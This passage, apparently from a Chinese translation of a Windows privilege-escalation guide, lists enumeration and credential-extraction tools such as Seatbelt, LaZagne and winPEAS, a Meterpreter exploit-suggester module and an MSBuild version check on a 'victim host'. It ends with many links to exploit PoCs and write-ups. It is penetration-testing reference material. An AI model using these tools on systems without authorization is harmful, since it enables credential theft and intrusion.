[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 枚举 host 以搜索 misconfigurations（更像是一个 gather info tool，而不是 privesc tool）（需要编译）**（**[**预编译版本**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**）**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 从大量 software 中提取 credentials（GitHub 中提供预编译的 exe）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp 的 C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- 检查 misconfiguration（GitHub 中提供预编译的 executable）。不推荐。在 Win10 中运行效果不佳。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 检查可能的 misconfigurations（来自 Python 的 exe）。不推荐。在 Win10 中运行效果不佳。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 基于本文创建的 tool（正常工作不需要 accesschk，但可以使用它）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 Python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- 读取 **systeminfo** 的输出并推荐可用的 exploits（本地 Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

你必须使用正确的 .NET 版本编译该 project（[参见此处](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。要查看 victim host 上已安装的 .NET 版本，可以执行：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalation 基础](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [通过利用弱文件夹权限提升权限](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - 速查表](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP 指南](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation 指南](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation 检查清单](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [面向 Pentesters 的 Windows Privilege Escalation 方法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo：通过 SMTP 进行 Word VBA 宏 phishing → hMailServer 凭据解密 → Veeam CVE-2023-27532 提升至 SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper：Format-string leak + stack BOF → VirtualAlloc ROP（RCE）和 kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – 追踪 Silver Fox：Kernel Shadows 中的猫鼠游戏](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA 系统中存在的 Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink 用法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [回到过去的 Link：滥用 Windows 上的 Symbolic Links](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF（Cobalt Strike BOF port）](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls：Windows 上危险的 Module Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules：从 `node_modules` 文件夹加载](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json：`optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor（Procmon）](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges，已解决](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 函数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop：通过 chaining CLDFLT 和 DirectX Kernel Race Conditions 实现 Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All：Windows 11 上完整的 Read/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [滥用 Arbitrary File Deletes 来提升权限及其他实用技巧](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks 第二部分：CVE-2020-1013，一次 Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7：探索 Credential Manager 和 Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - 基于 Kerberos Resource 的 Constrained Delegation：Image Change 如何导致 Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - 从 Windows 10 Ssh Agent 提取 Ssh Private Keys](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
{{#include ../../banners/hacktricks-training.md}}
